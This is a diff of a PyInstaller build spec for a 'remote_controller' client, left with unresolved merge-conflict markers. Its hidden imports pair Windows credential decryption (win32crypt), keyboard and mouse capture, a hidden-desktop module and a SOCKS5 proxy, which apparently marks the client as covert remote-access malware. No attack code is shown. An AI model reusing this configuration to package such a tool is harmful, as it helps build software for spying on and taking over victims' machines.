@@ -2,7 +2,11 @@
 from PyInstaller.utils.hooks import collect_submodules
 from PyInstaller.utils.hooks import collect_all
 
+<<<<<<< HEAD
 datas = [('C:\\Temp\\rc_build_tif05sp1\\remote_client\\rc_team_id.txt', 'remote_client'), ('C:\\Temp\\rc_build_tif05sp1\\remote_client\\rc_antifraud.json', 'remote_client'), ('C:\\Temp\\rc_build_tif05sp1\\remote_client\\rc_server.json', 'remote_client'), ('C:\\Temp\\rc_build_tif05sp1\\remote_client\\rc_activity.env', 'remote_client')]
+=======
+datas = [('C:\\Users\\makab\\AppData\\Local\\Temp\\rc_build_49cmfalo\\remote_client\\rc_team_id.txt', 'remote_client'), ('C:\\Users\\makab\\AppData\\Local\\Temp\\rc_build_49cmfalo\\remote_client\\rc_antifraud.json', 'remote_client'), ('C:\\Users\\makab\\AppData\\Local\\Temp\\rc_build_49cmfalo\\remote_client\\rc_server.json', 'remote_client')]
+>>>>>>> e7098c252fe0a3c7cff58170b56c7e36eee42638
 binaries = []
 hiddenimports = ['win32crypt', 'cryptography', 'pynput', 'pynput.mouse', 'pynput.keyboard', 'remote_client.config', 'remote_client.apps', 'remote_client.apps.launcher', 'remote_client.windows.hidden_desktop', 'remote_client.proxy.socks5_server']
 hiddenimports += collect_submodules('remote_client')
@@ -21,8 +25,13 @@ datas += tmp_ret[0]; binaries += tmp_ret[1]; hiddenimports += tmp_ret[2]
 
 
 a = Analysis(
+<<<<<<< HEAD
     ['C:\\Users\\ChalkBro\\Documents\\GitHub\\remote_controller\\client\\client.py'],
     pathex=['C:\\Users\\ChalkBro\\Documents\\GitHub\\remote_controller\\client'],
+=======
+    ['C:\\Users\\makab\\PycharmProjects\\ремоте контроллер\\client\\client.py'],
+    pathex=['C:\\Users\\makab\\PycharmProjects\\ремоте контроллер\\client'],
+>>>>>>> e7098c252fe0a3c7cff58170b56c7e36eee42638
     binaries=binaries,
     datas=datas,
     hiddenimports=hiddenimports,
